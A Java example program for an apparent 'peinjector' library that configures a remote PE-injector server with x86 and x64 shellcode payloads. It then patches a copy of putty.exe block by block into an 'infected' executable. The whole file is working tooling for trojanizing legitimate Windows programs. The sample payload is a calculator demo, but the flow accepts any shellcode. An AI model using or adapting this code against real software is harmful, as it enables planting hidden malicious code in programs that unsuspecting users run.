package eu.peinjector.example;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

import eu.peinjector.libpe.LibPeControlProtocol;
import eu.peinjector.libpe.LibPeDataProtocol;
import eu.peinjector.libpe.LibPePatch;
import eu.peinjector.libpe.LibPeServerConfig;
import eu.peinjector.libpe.LibPeShellcodeFactory;
import eu.peinjector.libpe.exceptions.LibPeProtocolException;
import eu.peinjector.libpe.exceptions.LibPeBadInputException;
import eu.peinjector.libpe.exceptions.LibPeSocketException;

public class EXAMPLE {

	public static void main(String[] args) {

		// change me
		//-----------------------------------------
		String peinjectorserver = "192.168.0.111";
		int controlPort 		= 31338;
		int dataPort 			= 31337;
		String sourceFile 		= "D:/putty.exe";
		String infectFile 		= "D:/putty2.exe";
		
		
		// example
		//-----------------------------------------
		
		//LibPeControlProtocol to manage the pe-injector
		LibPeControlProtocol control = new LibPeControlProtocol();
		
		//LibPeDataProtocol to send pe-header to the pe-injector and get patches
		LibPeDataProtocol data = new LibPeDataProtocol(control);

		//config the control class
		try {
			control.setServerAddress(peinjectorserver, controlPort, dataPort);
			
		} catch (LibPeBadInputException e1) {
			// the ip/host or the ports are invalide
			e1.printStackTrace();
		}
		
		//config the pe-injector
		try {
			boolean server_response;
			
			// set shellcode (x86)
			server_response = control.cmdSendSetPayloadX86( LibPeShellcodeFactory.demo_calc_x86() );
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			server_response = control.cmdSendSetPayloadNameX86("xyz-name-of-the-shellcode");
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			
			// set shellcode (x64)
			server_response = control.cmdSendSetPayloadX64( LibPeShellcodeFactory.demo_calc_x64() );
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			server_response = control.cmdSendSetPayloadNameX64("bla bla blub 64");
			if(!server_response) {
				System.err.println("server error! Wrong Token????");
				System.exit(1);
			}
			
			// read config
			String ini = control.cmdSendGetConfig();
			System.out.println(ini);
			
			// you can also use:
			LibPeServerConfig serverconf = control.cmdSendGetConfigAndParse();
			System.out.println( serverconf.getControl_port() );
			System.out.println( serverconf.getData_port() );
			System.out.println( serverconf.isPersistent_ports() );
			System.out.println( serverconf.getPayload_name_x64() );

			
		} catch (LibPeSocketException e1) {
			//  if the IP address of the host could not be determined
			e1.printStackTrace();
		} catch (LibPeProtocolException e1) {
			//  if the control protocol is corrupt
			e1.printStackTrace();
		}
		
		//patch a file on the fly
		try {
			applyPatch(data, new FileInputStream(sourceFile), new FileOutputStream(infectFile));
			
		} catch (FileNotFoundException e) {
			// from the FileInputStream
			e.printStackTrace();
		} catch (IOException e) {
			// from the FileInputStream
			e.printStackTrace();
		} catch (LibPeSocketException e) {
			// Socket errors
			e.printStackTrace();
		}

	}
	
	

	/**
	 * a simple example to use the pe-injector server
	 * 
	 * @param data is a ({@link LibPeDataProtocol})-Object zu communicate with the pe-injector server
	 * @param is inputstream (FileInputStream)
	 * @param os outputstream (FileOutputStream)
	 * 
	 * @throws IOException if an I/O error occurs when creating the socket
	 * @throws LibPeSocketException 
	 */
	public static void applyPatch(LibPeDataProtocol data, FileInputStream is, FileOutputStream os) throws IOException, LibPeSocketException {
		
		// some variables
		byte[] buffer = new byte[4096];
		int position = 0;
		
		// read the first block (4096) to get the pe-header
		is.read(buffer);
		
		// send the block to the server and get the patch for the file
		LibPePatch patch = data.getPatchFromPEinjector(buffer);
		
		// patch the file block by block
		do {
			// write the manipulated data (may be more than the buffer size)
			os.write( patch.applyPatch(buffer,position) );
			// set position to the next block
			position += buffer.length;
		} while (is.read(buffer) > 0);	// do while data to read

		// fin --> INFECTED!!!!!!
	}

}
